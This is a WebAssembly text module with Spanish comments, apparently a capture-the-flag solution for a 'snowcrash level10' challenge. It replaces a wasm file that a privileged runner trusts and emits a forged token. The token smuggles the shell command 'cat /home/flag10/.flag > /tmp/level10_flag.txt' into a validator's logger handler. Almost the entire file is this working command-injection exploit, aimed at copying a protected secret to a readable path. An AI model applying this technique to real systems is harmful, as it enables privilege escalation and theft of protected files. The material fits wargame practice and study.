;; enzo-injection.wat
;;
;; Modulo WAT de reemplazo para /opt/snowcrash/level10/enzo.wasm.
;;
;; enzo_runner ejecuta "wasmtime enzo.wasm | qjs validate.js": el .wasm
;; genera un token y lo escribe por stdout, y validate.js lo lee de stdin
;; para comprobarlo y despachar un comando. Como level10 puede sobrescribir
;; enzo.wasm, este modulo no recalcula ningun token: simplemente escribe por
;; fd_write (stdout) el token de inyeccion ya resuelto a mano (ver
;; find_injection_token.py), que hace que validate.js seleccione el handler
;; "logger" e inyecte un comando de shell para copiar la flag a un sitio
;; legible por level10.
(module
  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write (param i32 i32 i32 i32) (result i32)))
  (memory (export "memory") 1)

  ;; Token completo (65 bytes incluido el salto de linea final), en el
  ;; formato v1:<campo>:<firma> que exige validate.js. El campo contiene el
  ;; comando inyectado ("x1f;cat ...;#") y la firma "fc8c9815" selecciona
  ;; el handler logger (ver find_injection_token.py).
  (data (i32.const 64) "v1:x1f;cat /home/flag10/.flag > /tmp/level10_flag.txt;#:fc8c9815\n")

  (func (export "_start")
    ;; Construir el iovec en la direccion 0:
    ;;   iovec.buf     (offset 0) = 64  -> donde empieza el token
    ;;   iovec.buf_len (offset 4) = 65  -> longitud total del token
    i32.const 0
    i32.const 64
    i32.store
    i32.const 4
    i32.const 65
    i32.store

    ;; fd_write(fd=1 stdout, iovs_ptr=0, iovs_len=1, nwritten_ptr=8):
    ;; vuelca el token por la salida estandar, que enzo_runner conecta a
    ;; la entrada de validate.js.
    i32.const 1
    i32.const 0
    i32.const 1
    i32.const 8
    call $fd_write
    drop           ;; se descarta el codigo de error de fd_write
  )
)
